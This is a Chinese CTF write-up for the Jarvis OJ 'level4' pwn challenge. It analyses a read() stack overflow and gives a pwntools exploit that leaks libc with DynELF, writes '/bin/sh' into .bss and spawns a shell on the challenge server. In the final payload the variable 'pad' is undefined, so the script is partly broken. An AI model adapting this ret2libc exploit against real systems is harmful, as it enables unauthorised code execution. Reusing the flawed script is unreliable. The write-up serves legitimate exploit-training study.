# Jarvisoj--pwn--level4

## 题目分析

国际惯例，checksec一下

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

没有canary，没有地址随机化且栈不可执行，应该是栈溢出。

ida查看一波

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

```c++
ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  return read(0, &buf, 0x100u);
}
```

此处存在溢出。但该elf中没有system，也没有/bin/sh，连个libc文件都不给。

那只能用leak泄露内存的手段(换另一种方式泄露出system的地址)，然后把'/bin/sh'写进bss段或者data段。

这里我们运用DynELF模块。

### DynELF--Resolving remote functions using leaks

解析加载的，动态链接的ELF二进制文件中的symbols。给定一个可以在任意地址泄漏数据的函数，可以解析任何加载库中的任何symbols。

参数：

- **泄漏**（[*MemLeak*](https://pwntools.readthedocs.io/en/stable/memleak.html#pwnlib.memleak.MemLeak)） - 泄漏内存的pwnlib.memleak.MemLeak实例
- **pointer**（[*int*](https://docs.python.org/2.7/library/functions.html#int)） - 指向加载的ELF文件的指针
- **elf**（[*str*](https://docs.python.org/2.7/library/functions.html#str)*，*[*ELF*](https://pwntools.readthedocs.io/en/stable/elf/elf.html#pwnlib.elf.elf.ELF)） - 磁盘上ELF文件的路径，或已加载的路径`pwnlib.elf.ELF`。
- **libcdb**（[*bool*](https://docs.python.org/2.7/library/functions.html#bool)） - 尝试使用libcdb加速libc查找

## 利用思路

利用DynELF模块找到system的地址，但找不到'/bin/sh'这个字符串的地址。于是我们应控制read函数把'/bin/sh'写进bss段中。

### 第一步 利用DynELF泄露内存

查看栈

```
-00000088 buf             db ?
-00000087                 db ? ; undefined
。。。。。。。。。。。。。。。。。。。。。。。。
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

看出payload = ‘a' * (0x88+4) + ....

我们构造一下leak

```python
def leak(address):
    payload1='a'*(0x88+4)+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4)
    conn.sendline(payload1)
    data=conn.recv(4)
    return data 
d=DynELF(leak,elf)
```

### 第二步 求出system函数的地址和把'/bin/sh'写进bss段

查看ida，寻找bss段

```
.bss:0804A024 _bss            segment byte public 'BSS' use32
.bss:0804A024                 assume cs:_bss
.bss:0804A024                 ;org 804A024h
.bss:0804A024                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.bss:0804A024                 public __bss_start
.bss:0804A024 __bss_start     db ?                    ; DATA XREF: deregister_tm_clones+5↑o
.bss:0804A024                                         ; deregister_tm_clones+1E↑o ...
.bss:0804A024                                         ; Alternative name is '__TMC_END__'
.bss:0804A024                                         ; completed.7181
.bss:0804A024                                         ; _edata
.bss:0804A025                 db    ? ;
.bss:0804A026                 db    ? ;
.bss:0804A027 unk_804A027     db    ? ;               ; DATA XREF: deregister_tm_clones↑o
.bss:0804A027 _bss            ends
```

可知 0x0804a024

也可以 elf.symbols['__bss_start'] 求出地址

system_addr = d.lookup('system', 'libc')

read_addr = elf.symbols['read']

### 第三步 就是getshell了

exp:

```python
from pwn import *
conn=remote('pwn2.jarvisoj.com','9880')
e=ELF('./level4')

write_plt=e.symbols['write']
vul_addr=0x804844b
bss_addr=0x0804a024

def leak(address):
    payload1='a'*(0x88+4)+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4)
    conn.sendline(payload1)
    data=conn.recv(4)
    return data 
    
d=DynELF(leak,elf=ELF('./level4'))

system_addr=d.lookup('system','libc')
print hex(system_addr)
read_plt=e.symbols['read']

payload2='a'*(0x88+4) +p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)
conn.sendline(payload2)
conn.send("/bin/sh\x00")
payload3="a"*pad+"BBBB"+p32(system_addr)+'dead'+p32(bss_addr)
conn.sendline(payload3)
conn.interactive()
```

